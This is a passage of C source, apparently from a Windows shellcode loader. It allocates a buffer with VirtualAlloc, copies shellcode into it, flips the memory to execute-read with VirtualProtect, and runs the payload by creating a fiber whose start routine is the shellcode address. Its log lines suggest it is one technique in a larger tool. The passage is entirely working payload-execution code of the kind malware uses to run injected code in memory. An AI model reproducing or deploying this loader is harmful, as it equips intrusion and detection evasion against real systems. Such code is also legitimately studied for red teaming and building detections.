    LPVOID lpRX = VirtualAlloc(NULL, cbShellcode,
                               MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READ);
    if (!lpRX) {
        /* Fallback: alloc RW, copy, flip RX */
        lpRX = VirtualAlloc(NULL, cbShellcode,
                            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!lpRX) return FALSE;
        memcpy(lpRX, pbShellcode, cbShellcode);
        DWORD dwOld = 0;
        VirtualProtect(lpRX, cbShellcode, PAGE_EXECUTE_READ, &dwOld);
    } else {
        DWORD dwOld = 0;
        VirtualProtect(lpRX, cbShellcode, PAGE_READWRITE, &dwOld);
        memcpy(lpRX, pbShellcode, cbShellcode);
        VirtualProtect(lpRX, cbShellcode, PAGE_EXECUTE_READ, &dwOld);
    }
    fprintf(stdout, "[MODERN][FIBER] RX shellcode mapping at %p (%zu bytes)\n",
            lpRX, cbShellcode);

    /* Convert thread to fiber */
    LPVOID lpMainFiber = ConvertThreadToFiber(NULL);
    if (!lpMainFiber) {
        fprintf(stderr, "[MODERN][FIBER] ConvertThreadToFiber failed: %lu\n", GetLastError());
        VirtualFree(lpRX, 0, MEM_RELEASE);
        return FALSE;
    }

    /* Create payload fiber — start routine: direct RX memory address */
    LPVOID lpPayloadFiber = CreateFiber(0,
        (LPFIBER_START_ROUTINE)lpRX, lpMainFiber);
    if (!lpPayloadFiber) {
        fprintf(stderr, "[MODERN][FIBER] CreateFiber failed: %lu\n", GetLastError());
        VirtualFree(lpRX, 0, MEM_RELEASE);
        return FALSE;
    }
    fprintf(stdout, "[MODERN][FIBER] Switching to payload fiber...\n");
    SwitchToFiber(lpPayloadFiber);
    fprintf(stdout, "[MODERN][FIBER] Returned from payload fiber.\n");

    DeleteFiber(lpPayloadFiber);
    VirtualFree(lpRX, 0, MEM_RELEASE);
    return TRUE;
}

